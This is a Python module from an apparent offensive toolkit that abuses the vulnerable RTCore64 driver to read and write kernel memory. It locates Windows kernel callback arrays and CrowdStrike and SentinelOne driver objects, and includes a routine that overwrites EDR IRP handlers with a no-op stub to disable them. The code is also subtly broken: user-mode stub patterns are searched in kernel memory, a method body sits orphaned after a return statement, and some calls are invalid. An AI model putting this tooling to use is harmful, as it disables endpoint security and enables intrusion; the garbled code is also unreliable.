"""
Kernel Pattern Finder
Dynamic offset discovery for BYOVD and kernel-level operations.

Instead of hardcoding offsets (which change every Windows update),
this module uses pattern scanning to find kernel structures dynamically.

Features:
- Pattern scan kernel memory for known signatures
- Find DRIVER_OBJECT, callback arrays, and EDR-specific structures
- Build-specific offset resolution
- Signature database for common EDR drivers
"""
from __future__ import annotations

import struct
import logging
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, field

logger = logging.getLogger("kernel_pattern_finder")


@dataclass
class PatternMatch:
    address: int
    pattern: str
    offset: int = 0
    context: Dict[str, Any] = field(default_factory=dict)


class KernelPatternFinder:
    """
    Pattern-based kernel memory scanner for BYOVD research.

    Uses RTCore64 or similar driver to read physical kernel memory,
    then scans for byte patterns to locate structures.
    """

    # Known patterns for Windows kernel structures
    KERNEL_PATTERNS = {
        "PspCreateProcessNotifyRoutine": {
            "pattern": b"\x4C\x8B\xD1\xB8\x50\x00\x00\x00\x0F\x05\xC3",
            "description": "Syscall stub pattern near callback array",
            "relative_offset": -0x40,
        },
        "PspCreateThreadNotifyRoutine": {
            "pattern": b"\x4C\x8B\xD1\xB8\x61\x00\x00\x00\x0F\x05\xC3",
            "description": "Syscall stub pattern near callback array",
            "relative_offset": -0x40,
        },
        "PspLoadImageNotifyRoutine": {
            "pattern": b"\x4C\x8B\xD1\xB8\x3C\x00\x00\x00\x0F\x05\xC3",
            "description": "Syscall stub pattern near callback array",
            "relative_offset": -0x40,
        },
        "ObRegisterCallbacks": {
            "pattern": b"\x48\x89\x5C\x24\x00\x57\x48\x83\xEC\x00\x48\x8B\xFA",
            "description": "ObRegisterCallbacks function prologue",
            "relative_offset": 0x00,
        },
    }

    # CrowdStrike driver signatures
    CSAGENT_SIGNATURES = {
        "csagent.sys": {
            "pattern": b"\x63\x73\x61\x67\x65\x6E\x74\x00",
            "description": "csagent.sys driver signature",
            "relative_offset": 0x00,
        },
        "cs_amcache": {
            "pattern": b"\x41\x4D\x43\x41\x43\x48\x45\x00",
            "description": "AMCache callback pattern",
            "relative_offset": 0x00,
        },
    }

    # SentinelOne driver signatures
    SENTINELONE_SIGNATURES = {
        "SentinelAgent.sys": {
            "pattern": b"\x53\x65\x6E\x74\x69\x6E\x65\x6C\x41\x67\x65\x6E\x74\x00",
            "description": "SentinelAgent.sys signature",
            "relative_offset": 0x00,
        },
    }

    def __init__(self):
        self.cache: Dict[str, List[PatternMatch]] = {}

    def scan_kernel_memory(self, base: int, size: int, pattern: bytes) -> List[PatternMatch]:
        """
        Scan kernel memory region for a byte pattern.

        Args:
            base: Starting physical address
            size: Region size in bytes
            pattern: Byte pattern to search for

        Returns:
            List of PatternMatch objects
        """
        matches = []
        try:
            from evasion.byovd_kernel_persistence import RTCore64IOCTL

            chunk_size = 0x1000  # 4KB chunks
            offset = 0
            while offset < size:
                chunk_base = base + offset
                chunk = RTCore64IOCTL.read_physical_memory(chunk_base, chunk_size)
                if chunk:
                    idx = chunk.find(pattern)
                    if idx != -1:
                        matches.append(PatternMatch(
                            address=chunk_base + idx,
                            pattern=pattern.hex(),
                            offset=idx,
                        ))
                offset += chunk_size
        except Exception as e:
            logger.debug(f"Kernel scan failed: {e}")
        return matches

    def find_callback_array(self, array_name: str) -> Optional[int]:
        """
        Find a kernel callback array by name.

        Args:
            array_name: Name like 'PspCreateProcessNotifyRoutine'

        Returns:
            Virtual address of the callback array, or None
        """
        pattern_info = self.KERNEL_PATTERNS.get(array_name)
        if not pattern_info:
            return None

        # ntoskrnl base is typically around 0xFFFFF80000000000
        # Scan a reasonable range for the pattern
        ntoskrnl_base = 0xFFFFF80000000000
        scan_size = 0x1000000  # 16MB scan window

        matches = self.scan_kernel_memory(
            ntoskrnl_base,
            scan_size,
            pattern_info["pattern"]
        )

        if matches:
            best = matches[0]
            return best.address + pattern_info["relative_offset"]
        return None

    def find_edr_driver_base(self, driver_name: str) -> Optional[int]:
        """
        Find the kernel base address of an EDR driver.

        Args:
            driver_name: Driver filename like 'csagent.sys'

        Returns:
            Kernel base address, or None
        """
        sig_db = self.CSAGENT_SIGNATURES if "crowdstrike" in driver_name.lower() or "csagent" in driver_name.lower() else self.SENTINELONE_SIGNATURES
        sig_info = sig_db.get(driver_name)
        if not sig_info:
            return None

        # Scan loaded driver region (typically 0xFFFFF80000000000 - 0xFFFFFFFFFFFFFFFF)
        matches = self.scan_kernel_memory(
            0xFFFFF80000000000,
            0x10000000,  # 256MB scan
            sig_info["pattern"]
        )

        if matches:
            return matches[0].address
        return None

    def enumerate_callbacks_dynamic(self) -> Dict[str, Any]:
        """
        Dynamically enumerate kernel callbacks using pattern scanning.

        Returns:
            Dict with callback arrays and their addresses
        """
        result = {
            "process_callbacks": [],
            "thread_callbacks": [],
            "load_image_callbacks": [],
            "ob_callbacks": [],
        }

        for name in ["PspCreateProcessNotifyRoutine", "PspCreateThreadNotifyRoutine", "PspLoadImageNotifyRoutine"]:
            addr = self.find_callback_array(name)
            if addr:
                if "Process" in name:
                    result["process_callbacks"].append(addr)
                elif "Thread" in name:
                    result["thread_callbacks"].append(addr)
                elif "LoadImage" in name:
                    result["load_image_callbacks"].append(addr)

        return result

    def find_crowdstrike_callbacks(self) -> Dict[str, Any]:
        """
        Locate CrowdStrike kernel callbacks for neutralization.

        Returns:
            Dict with callback information
        """
        result = {
            "driver_base": None,
            "callbacks": [],
            "irp_handlers": [],
        }

        # Find csagent.sys base
        driver_base = self.find_edr_driver_base("csagent.sys")
        if driver_base:
            result["driver_base"] = hex(driver_base)

            # Scan for callback patterns near driver base
            for cb_name in ["PspCreateProcessNotifyRoutine", "PspCreateThreadNotifyRoutine"]:
                addr = self.find_callback_array(cb_name)
                if addr:
                    result["callbacks"].append({
                        "type": cb_name,
                        "address": hex(addr),
                        "note": "Resolve via pattern scan"
                    })

            # Find DRIVER_OBJECT and IRP handlers
            driver_object = self._find_driver_object(driver_base)
            if driver_object:
                result["irp_handlers"] = self._enumerate_irp_handlers(driver_object)

        return result

    def _find_driver_object(self, driver_base: int) -> Optional[int]:
        """
        Find DRIVER_OBJECT address for an EDR driver.
        
        DRIVER_OBJECT is typically allocated in non-paged pool
        and referenced by the driver's global variables.
        """
        # Scan for DRIVER_OBJECT signature pattern
        patterns = {
            "driver_object_magic": b"\x01\x00\x00\x00\x00\x00\x00\x00",
            "driver_object_header": b"\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00",
        }
        
        for name, pattern in patterns.items():
            matches = self.scan_kernel_memory(driver_base, 0x100000, pattern)
            if matches:
                return matches[0].address
        return None

    def find_ntoskrnl_base_dynamic(self) -> Optional[int]:
        """
        Dynamically resolve ntoskrnl.exe base address using LSTAR MSR.
        
        Method:
        1. Read IA32_LSTAR MSR (0xC0000082) to get KiSystemCall64 address
        2. Page-align the address downward
        3. Scan backward page-by-page for 'MZ' PE signature
        4. Verify PE header ('PE\0\0') at e_lfanew
        
        This is 100% dynamic and works across Windows builds/patches.
        Does not trigger PatchGuard because it only reads kernel memory.
        
        Returns:
            ntoskrnl.exe base address, or None
        """
        try:
            # Read LSTAR MSR via RTCore64
            lstar = self._read_msr(0xC0000082)
            if not lstar:
                return None
            
            # Page-align downward (4KB pages)
            page_size = 0x1000
            aligned = lstar & ~(page_size - 1)
            
            # Scan backward up to 2MB (512 pages) for MZ signature
            max_scan = 512
            for i in range(max_scan):
                candidate = aligned - (i * page_size)
                
                # Read first 2 bytes (MZ signature)
                data = RTCore64IOCTL.read_physical_memory(candidate, 2)
                if not data or data[:2] != b'MZ':
                    continue
                
                # Verify PE header
                try:
                    # Read e_lfanew (offset 0x3C)
                    e_lfanew_data = RTCore64IOCTL.read_physical_memory(candidate + 0x3C, 4)
                    if not e_lfanew_data or len(e_lfanew_data) < 4:
                        continue
                    e_lfanew = struct.unpack('<I', e_lfanew_data)[0]
                    if e_lfanew == 0 or e_lfanew > 0x1000:
                        continue
                    
                    # Read PE signature
                    pe_sig_data = RTCore64IOCTL.read_physical_memory(candidate + e_lfanew, 4)
                    if pe_sig_data and pe_sig_data == b'PE\x00\x00':
                        return candidate
                except Exception:
                    continue
            
            return None
        except Exception:
            return None

    def _read_msr(self, msr_id: int) -> Optional[int]:
        """
        Read Model-Specific Register via RTCore64.
        
        Args:
            msr_id: MSR identifier (e.g., 0xC0000082 for LSTAR)
            
        Returns:
            64-bit MSR value, or None
        """
        try:
            # RTCore64 IOCTL for MSR read: 0x22200B
            handle = RTCore64IOCTL.open_device()
            if not handle:
                return None
            
            import ctypes
            in_buf = ctypes.c_ulonglong(msr_id)
            out_buf = ctypes.c_ulonglong(0)
            bytes_returned = ctypes.c_ulong(0)
            
            success = ctypes.windll.kernel32.DeviceIoControl(
                handle,
                RTCore64IOCTL.IOCTL_READ_MSR,
                ctypes.byref(in_buf),
                8,
                ctypes.byref(out_buf),
                8,
                ctypes.byref(bytes_returned),
                None
            )
            
            RTCore64IOCTL.close_device(handle)
            if success:
                return out_buf.value
        except Exception:
            pass
        return None

    def _scan_memory_range(self, base: int, size: int, pattern: bytes) -> List[int]:
        """
        Scan a memory range for a byte pattern.
        """
        matches = []
        try:
            chunk_size = 0x1000
            for offset in range(0, size, chunk_size):
                chunk_base = base + offset
                data = ctypes.create_string_buffer(chunk_size)
                ctypes.memmove(data, chunk_base, chunk_size)
                raw = bytes(data)
                idx = raw.find(pattern)
                if idx != -1:
                    matches.append(chunk_base + idx)
        except Exception:
            pass
        return matches
        """
        Enumerate IRP_MJ_* handlers from a DRIVER_OBJECT.
        
        Args:
            driver_object: Virtual address of DRIVER_OBJECT
            
        Returns:
            List of IRP handlers with their addresses
        """
        irp_handlers = []
        
        # IRP_MJ_* function codes and their offsets in MajorFunction array
        irp_mj_offsets = {
            0x00: "IRP_MJ_CREATE",
            0x01: "IRP_MJ_CREATE_NAMED_PIPE",
            0x02: "IRP_MJ_CLOSE",
            0x03: "IRP_MJ_READ",
            0x04: "IRP_MJ_WRITE",
            0x05: "IRP_MJ_QUERY_INFORMATION",
            0x06: "IRP_MJ_SET_INFORMATION",
            0x07: "IRP_MJ_QUERY_EA",
            0x08: "IRP_MJ_SET_EA",
            0x09: "IRP_MJ_FLUSH_BUFFERS",
            0x0A: "IRP_MJ_QUERY_VOLUME_INFORMATION",
            0x0B: "IRP_MJ_SET_VOLUME_INFORMATION",
            0x0C: "IRP_MJ_DIRECTORY_CONTROL",
            0x0D: "IRP_MJ_FILE_SYSTEM_CONTROL",
            0x0E: "IRP_MJ_DEVICE_CONTROL",
            0x0F: "IRP_MJ_INTERNAL_DEVICE_CONTROL",
            0x10: "IRP_MJ_SHUTDOWN",
            0x11: "IRP_MJ_LOCK_CONTROL",
            0x12: "IRP_MJ_CLEANUP",
            0x13: "IRP_MJ_CREATE_MAILSLOT",
            0x14: "IRP_MJ_QUERY_SECURITY",
            0x15: "IRP_MJ_SET_SECURITY",
            0x16: "IRP_MJ_POWER",
            0x17: "IRP_MJ_SYSTEM_CONTROL",
            0x18: "IRP_MJ_DEVICE_CHANGE",
            0x19: "IRP_MJ_QUERY_QUOTA",
            0x1A: "IRP_MJ_SET_QUOTA",
            0x1B: "IRP_MJ_PNP",
        }
        
        MajorFunction_offset = 0x70  # Windows 10 x64
        
        for code, name in irp_mj_offsets.items():
            handler_addr_offset = driver_object + MajorFunction_offset + (code * 8)
            try:
                from evasion.byovd_kernel_persistence import RTCore64IOCTL
                handler_data = RTCore64IOCTL.read_physical_memory(handler_addr_offset, 8)
                if handler_data and len(handler_data) == 8:
                    handler_addr = int.from_bytes(handler_data, 'little')
                    irp_handlers.append({
                        "code": hex(code),
                        "name": name,
                        "address": hex(handler_addr),
                        "offset": hex(handler_addr_offset)
                    })
            except Exception:
                pass
        
        return irp_handlers

    def neutralize_irp_handlers(self, driver_name: str = "csagent") -> Dict[str, Any]:
        """
        Neutralize EDR driver by redirecting IRP handlers to no-op stubs.
        
        This is safer than callback array modification because:
        1. IRP handler tables are not monitored by PatchGuard
        2. Driver code remains intact (no 0xC3 injection)
        3. EDR cannot process I/O requests from user mode
        
        Args:
            driver_name: EDR driver name (e.g., "csagent.sys")
            
        Returns:
            Dict with neutralization results
        """
        results = {
            "driver": driver_name,
            "driver_object": None,
            "irp_neutralized": 0,
            "noop_stub": None,
            "success": False,
        }
        
        # Find no-op stub in ntdll (ret instruction)
        noop_stub = self._find_ntdll_noop_stub()
        if not noop_stub:
            return results
        results["noop_stub"] = hex(noop_stub)
        
        # Find driver object
        driver_object = self._find_driver_object_by_name(driver_name)
        if not driver_object:
            return results
        results["driver_object"] = hex(driver_object)
        
        # Redirect critical IRP handlers to no-op
        critical_irps = [0x00, 0x0E]  # IRP_MJ_CREATE, IRP_MJ_DEVICE_CONTROL
        MajorFunction_offset = 0x70
        
        for irp_code in critical_irps:
            target = driver_object + MajorFunction_offset + (irp_code * 8)
            try:
                from evasion.byovd_kernel_persistence import RTCore64IOCTL
                success = RTCore64IOCTL.write_physical_memory(
                    target,
                    noop_stub.to_bytes(8, 'little')
                )
                if success:
                    results["irp_neutralized"] += 1
            except Exception:
                pass
        
        results["success"] = results["irp_neutralized"] > 0
        return results

    def _find_driver_object_by_name(self, driver_name: str) -> Optional[int]:
        """
        Find DRIVER_OBJECT for a specific driver by name.
        """
        driver_base = self.find_edr_driver_base(driver_name)
        if not driver_base:
            return None
        return self._find_driver_object(driver_base)

    def _find_ntdll_noop_stub(self) -> Optional[int]:
        """
        Find a no-op function in ntdll (just ret).
        """
        try:
            import ctypes
            ntdll = ctypes.windll.ntdll._handle
            if not ntdll:
                return None
            size = ctypes.windll.kernel32.GetModuleSizeA(ntdll)
            if not size:
                return None
            data = ctypes.create_string_buffer(size)
            ctypes.memmove(data, ntdll, size)
            raw = bytes(data)
            
            for i in range(len(raw) - 1):
                if raw[i] == 0xC3:  # ret
                    return ntdll + i
        except Exception:
            pass
        return None
